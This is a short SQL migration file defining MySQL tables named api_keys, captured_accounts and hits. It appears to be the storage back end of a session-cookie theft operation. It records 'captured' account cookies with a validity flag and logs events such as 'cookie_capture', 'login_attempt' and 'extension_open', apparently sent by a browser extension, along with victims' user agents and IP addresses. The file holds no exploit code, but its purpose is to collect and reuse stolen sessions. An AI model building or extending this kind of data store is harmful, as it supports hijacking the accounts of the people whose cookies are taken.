CREATE TABLE `api_keys` (
	`id` int AUTO_INCREMENT NOT NULL,
	`key` varchar(64) NOT NULL,
	`name` text NOT NULL,
	`userId` int NOT NULL,
	`isActive` boolean NOT NULL DEFAULT true,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	`lastUsedAt` timestamp,
	CONSTRAINT `api_keys_id` PRIMARY KEY(`id`),
	CONSTRAINT `api_keys_key_unique` UNIQUE(`key`)
);
--> statement-breakpoint
CREATE TABLE `captured_accounts` (
	`id` int AUTO_INCREMENT NOT NULL,
	`cookie` text NOT NULL,
	`capturedAt` timestamp NOT NULL DEFAULT (now()),
	`lastUsedAt` timestamp,
	`isValid` boolean NOT NULL DEFAULT true,
	`metadata` text,
	CONSTRAINT `captured_accounts_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `hits` (
	`id` int AUTO_INCREMENT NOT NULL,
	`eventType` enum('cookie_capture','login_attempt','extension_open','click') NOT NULL,
	`cookie` text,
	`userAgent` text,
	`ipAddress` varchar(45),
	`metadata` text,
	`timestamp` timestamp NOT NULL DEFAULT (now()),
	`apiKeyId` int,
	CONSTRAINT `hits_id` PRIMARY KEY(`id`)
);
